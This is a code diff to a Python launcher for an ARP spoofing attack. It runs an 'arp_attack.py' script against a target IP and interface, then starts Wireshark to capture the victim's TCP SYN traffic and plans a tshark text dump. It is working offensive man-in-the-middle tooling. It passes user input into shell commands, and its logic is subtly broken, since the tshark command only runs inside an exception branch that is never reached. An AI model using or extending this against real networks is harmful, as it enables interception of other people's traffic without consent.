@@ -1,4 +1,4 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 
 
 import argparse
@@ -38,27 +38,37 @@ class Controll :
                     print("[*] Error    -----------------|-> Interface not Found "  )
                     exit()    
                else:
-                   pass       
+                   subprocess.call(["chmod +x ./arppacket/arp_attack.py"],shell=True)
                if self.args.repate:
                     args = '-I '+self.args.Interface+' -T '+ self.args.Target +' -M ' +self.args.dest +' -R '+ self.args.repate+' '
                else:
                     args = "-I "+self.args.Interface+" -T "+ self.args.Target +" -M " +self.args.dest 
-               command_proc = 'gnome-terminal  -e ' +'"'+' ./Packagearp/arp_attack.py ' + args +'"'                  
+               command_proc = ' gnome-terminal  -e ' +'"'+'./arppacket/arp_attack.py ' + args +'"'                  
                call_termminal = subprocess.call(command_proc,shell=True,stderr=subprocess.PIPE)   
                 
                if self.args.Wireshark and 'true' in sys.argv :
-
-                  if not os.path.exists("./capture"):
-                     os.mkdir("./capture")
-                  if os.path.exists("./capture/"+self.args.Target):
-                     os.remove("./capture/"+self.args.Target)
-                  os.chown("./capture",0, 0)
-                  self.CommandWireShark= "wireshark -i "+self.args.Interface+" -k "+"-Y ip.dst=="+self.args.Target+ " -S -N 'mnNdtv'  -w ./capture/"+self.args.Target+"  2>/dev/null" 
+                  time.sleep(5)
+                  if not os.path.exists("./capture/"+self.args.Target):
+                     os.mkdir("./capture/"+self.args.Target)
+                  if os.path.exists("./capture/"+self.args.Target+"/"+self.args.Target):
+                     os.remove("./capture/"+self.args.Target+"/"+self.args.Target)
+                  os.chown("./capture/"+self.args.Target+"/",0, 0)
+                  filtter = "tcp[13]==2 "
+                  self.CommandWireShark= "wireshark -i "+self.args.Interface+" -k  -Y "+filtter+\
+                  " -N 'mnNdtv' -w ./capture/"+self.args.Target+"/"+self.args.Target+" 2>/dev/null" 
                   os.system(self.CommandWireShark)
-                  os.system("./capture/"+self.CommandWireShark)
                   id_user =  os.stat("./arpattack.py").st_uid
-                  os.chown("./capture", id_user, id_user)
                   os.chown("./capture/"+self.args.Target, id_user, id_user)
+                  os.chown("./capture/"+self.args.Target+"/"+self.args.Target, id_user, id_user)
+                  try:
+                     commant2 =" tshark -X lua_script:"+"1"+" -r "+"./capture/"+self.args.Target+"/"+self.args.Target+\
+                     " -V -T text > "+"./capture/"+self.args.Target+"/"+self.args.Target+".txt 2>/dev/null"
+                  except FileNotFoundError :
+                     try:
+                       os.system(commant2)
+                       os.chown("./capture/"+self.args.Target+"/"+self.args.Target+".txt", id_user, id_user)
+                     except :
+                        pass
         def arg_pares_on(self):
             parser = argparse.ArgumentParser( description="Usage: <OPtion> <arguments> ")          
             parser.add_argument( '-I',"--Interface"  ,dest = "Interface" ,required=True   , action=None )
